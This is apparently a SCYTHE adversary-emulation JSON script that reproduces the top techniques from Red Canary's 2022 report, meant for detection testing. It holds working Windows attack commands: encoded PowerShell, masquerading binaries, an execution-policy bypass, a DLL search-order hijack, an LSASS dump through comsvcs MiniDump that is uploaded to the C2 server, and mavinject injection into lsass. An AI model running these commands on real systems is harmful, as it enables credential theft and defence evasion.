# RedCanary/RedCanary2022TDR_scythe_threat.json
{
    "threat": {
        "category": "User-Defined",
        "description": "Top techniques from Red Canary 2022 Threat Detection Report",
        "display_name": "RedCanary2022TDR",
        "name": "RedCanary2022TDR",
        "operating_system_name": "windows",
        "script": {
            "0": {
                "conf": "--cp 127.0.0.1:443 --heartbeat 2 --multipart 10240 --secure true",
                "module": "https",
                "type": "initialization"
            },
            "1": {
                "module": "loader",
                "module_to_load": "run",
                "request": "--load run",
                "type": "message"
            },
            "2": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "powershell.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==",
                "rtags": [
                    "att&ck-technique:T1059.001"
                ],
                "type": "message"
            },
            "3": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe \"%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt\"",
                "rtags": [
                    "att&ck-technique:T1059.003"
                ],
                "type": "message"
            },
            "4": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "rundll32.exe pcwutl.dll,LaunchApplication C:\\Windows\\System32\\notepad.exe",
                "rtags": [
                    "att&ck-technique:T1218.011"
                ],
                "type": "message"
            },
            "5": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "wmic /node:\"127.0.0.1\" process call create \"calc.exe\"",
                "rtags": [
                    "att&ck-technique:T1047"
                ],
                "type": "message"
            },
            "6": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "powershell (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt",
                "rtags": [
                    "att&ck-technique:T1105"
                ],
                "type": "message"
            },
            "7": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR \"cmd /c date /T > C:\\Windows\\Temp\\current_date.txt\"",
                "rtags": [
                    "att&ck-technique:T1053.005"
                ],
                "type": "message"
            },
            "8": {
                "module": "loader",
                "module_to_load": "downloader",
                "request": "--load downloader",
                "type": "message"
            },
            "9": {
                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                "module": "downloader",
                "request": "--src VFS:/shared/threats/RedCanary/obfuscation.ps1 --dest .\\obfuscation.ps1",
                "type": "message"
            },
            "10": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "powershell Set-ExecutionPolicy Bypass -Scope Process -Force ; .\\obfuscation.ps1",
                "rtags": [
                    "att&ck-technique:T1027"
                ],
                "type": "message"
            },
            "11": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\notepad.exe",
                "rtags": [
                    "att&ck-technique:T1036"
                ],
                "type": "message"
            },
            "12": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c C:\\Windows\\Temp\\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==",
                "rtags": [
                    "att&ck-technique:T1036.003"
                ],
                "type": "message"
            },
            "13": {
                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                "module": "downloader",
                "request": "--src VFS:/shared/threats/RedCanary/tweet.ps1 --dest .\\tweet.ps1",
                "type": "message"
            },
            "14": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "powershell Set-ExecutionPolicy Bypass -Scope Process -Force ; .\\tweet.ps1",
                "rtags": [
                    "att&ck-technique:T1036.005"
                ],
                "type": "message"
            },
            "15": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe",
                "rtags": [
                    "att&ck-technique:T1574.001"
                ],
                "type": "message"
            },
            "16": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll",
                "rtags": [
                    "att&ck-technique:T1574.001"
                ],
                "type": "message"
            },
            "17": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c %APPDATA%\\updater.exe -Command exit",
                "rtags": [
                    "att&ck-technique:T1574.001"
                ],
                "type": "message"
            },
            "18": {
                "name": "STEP",
                "type": "assign",
                "value": "CLEANUP"
            },
            "19": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "wmic process where name=\"notepad.exe\" delete",
                "type": "message"
            },
            "20": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "wmic process where name=\"Calculator.exe\" delete",
                "type": "message"
            },
            "21": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del hello.txt",
                "type": "message"
            },
            "22": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del tweet.ps1",
                "type": "message"
            },
            "23": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del obfuscation.ps1",
                "type": "message"
            },
            "24": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del LICENSE.txt",
                "type": "message"
            },
            "25": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del C:\\Windows\\Temp\\notepad.exe",
                "type": "message"
            },
            "26": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del C:\\Windows\\Temp\\svchost.exe",
                "type": "message"
            },
            "27": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del %APPDATA%\\updater.exe",
                "type": "message"
            },
            "28": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del %APPDATA%\\amsi.dll",
                "type": "message"
            },
            "29": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "schtasks /Delete /TN CMDTestTask /F",
                "type": "message"
            },
            "30": {
                "name": "STEP",
                "type": "assign",
                "value": "REQUIRES PRIV"
            },
            "31": {
                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
                "module": "controller",
                "request": "--integrity",
                "type": "message"
            },
            "32": {
                "function": "ifelse",
                "next": "38",
                "step": "31",
                "type": "decision",
                "value": "High",
                "verb": "does not contain"
            },
            "33": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "powershell rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\Windows\\Temp\\lsass.dmp full",
                "rtags": [
                    "att&ck-technique:T1003.001"
                ],
                "type": "message"
            },
            "34": {
                "module": "loader",
                "module_to_load": "uploader",
                "request": "--load uploader",
                "type": "message"
            },
            "35": {
                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                "module": "uploader",
                "request": "--remotepath C:\\Windows\\Temp\\lsass.dmp",
                "type": "message"
            },
            "36": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cmd.exe /c del C:\\Windows\\Temp\\lsass.dmp",
                "type": "message"
            },
            "37": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "powershell mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\\Windows\\System32\\vbscript.dll",
                "rtags": [
                    "att&ck-technique:T1055"
                ],
                "type": "message"
            },
            "38": {
                "module": "controller",
                "request": "--shutdown",
                "rtags": [
                    "scythe",
                    "att&ck",
                    "att&ck-tactic:TA0011",
                    "att&ck-technique:T1219"
                ],
                "type": "message"
            }
        },
        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
        "tags": []
    }
}